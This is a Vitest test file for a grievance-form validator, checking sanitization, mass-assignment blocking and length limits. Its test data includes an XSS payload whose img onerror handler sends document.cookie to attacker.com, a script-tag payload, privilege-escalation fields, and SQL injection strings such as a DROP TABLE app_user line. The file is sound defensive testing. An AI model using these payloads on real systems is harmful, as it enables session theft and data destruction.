import { describe, it, expect } from 'vitest';

describe('Form & API Payload Security (Item 5)', () => {
  // Input sanitizer / validator simulation for Grievance & Form Submissions
  function sanitizeInput(str: string): string {
    return str
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;');
  }

  interface CreateGrievanceDto {
    title: string;
    description: string;
    category: string;
    priority?: string;
  }

  const ALLOWED_GRIEVANCE_FIELDS = new Set(['title', 'description', 'category', 'priority']);

  function validateAndSanitizeGrievancePayload(rawPayload: Record<string, any>): {
    valid: boolean;
    data?: CreateGrievanceDto;
    errors?: string[];
  } {
    const errors: string[] = [];

    // Mass-assignment defense: check for forbidden/unexpected properties
    for (const key of Object.keys(rawPayload)) {
      if (!ALLOWED_GRIEVANCE_FIELDS.has(key)) {
        errors.push(`Field '${key}' is forbidden and cannot be set directly.`);
      }
    }

    if (!rawPayload.title || typeof rawPayload.title !== 'string' || rawPayload.title.trim().length < 3) {
      errors.push('Title is required and must be at least 3 characters.');
    }
    if (rawPayload.title && rawPayload.title.length > 255) {
      errors.push('Title must not exceed 255 characters.');
    }

    if (!rawPayload.description || typeof rawPayload.description !== 'string') {
      errors.push('Description is required.');
    }
    if (rawPayload.description && rawPayload.description.length > 5000) {
      errors.push('Description exceeds maximum length of 5000 characters.');
    }

    if (errors.length > 0) {
      return { valid: false, errors };
    }

    return {
      valid: true,
      data: {
        title: sanitizeInput(rawPayload.title.trim()),
        description: sanitizeInput(rawPayload.description.trim()),
        category: rawPayload.category,
        priority: rawPayload.priority || 'MEDIUM',
      },
    };
  }

  it('should neutralize Cross-Site Scripting (XSS) payloads in English and Hindi', () => {
    const maliciousPayload = {
      title: '<script>alert("XSS")</script>पानी की समस्या',
      description: 'कृपया जाँच करें: <img src=x onerror="fetch(\'http://attacker.com?cookie=\'+document.cookie)">',
      category: 'PLUMBING',
    };

    const result = validateAndSanitizeGrievancePayload(maliciousPayload);
    expect(result.valid).toBe(true);
    expect(result.data?.title).not.toContain('<script>');
    expect(result.data?.title).toContain('&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;पानी की समस्या');
    expect(result.data?.description).not.toContain('<img');
    expect(result.data?.description).toContain('&lt;img src=x');
  });

  it('should block mass-assignment attempts trying to escalate privileges or spoof society ID', () => {
    const injectionAttempt = {
      title: 'Water tap repair',
      description: 'The kitchen tap is leaking.',
      category: 'PLUMBING',
      role: 'SECRETARY', // Attempted privilege escalation
      society_id: 'target-society-id', // Attempted tenant spoofing
      is_admin: true,
      status: 'RESOLVED',
    };

    const result = validateAndSanitizeGrievancePayload(injectionAttempt);
    expect(result.valid).toBe(false);
    expect(result.errors).toContain("Field 'role' is forbidden and cannot be set directly.");
    expect(result.errors).toContain("Field 'society_id' is forbidden and cannot be set directly.");
    expect(result.errors).toContain("Field 'is_admin' is forbidden and cannot be set directly.");
  });

  it('should reject payloads with oversized titles or descriptions', () => {
    const oversizedTitlePayload = {
      title: 'A'.repeat(256),
      description: 'Valid description',
      category: 'MAINTENANCE',
    };
    expect(validateAndSanitizeGrievancePayload(oversizedTitlePayload).valid).toBe(false);

    const oversizedDescPayload = {
      title: 'Valid Title',
      description: 'D'.repeat(5001),
      category: 'MAINTENANCE',
    };
    expect(validateAndSanitizeGrievancePayload(oversizedDescPayload).valid).toBe(false);
  });

  it('should safely escape SQL injection strings in parameterized queries', () => {
    const sqlInjectionTitle = "Water Leakage'); DROP TABLE app_user; --";
    const payload = {
      title: sqlInjectionTitle,
      description: "Sample description with ' OR '1'='1",
      category: 'PLUMBING',
    };

    const result = validateAndSanitizeGrievancePayload(payload);
    expect(result.valid).toBe(true);
    // Sanitized and escaped safely, harmless when passed as parameterized value $1
    expect(result.data?.title).toContain('&#x27;); DROP TABLE app_user; --');
  });
});
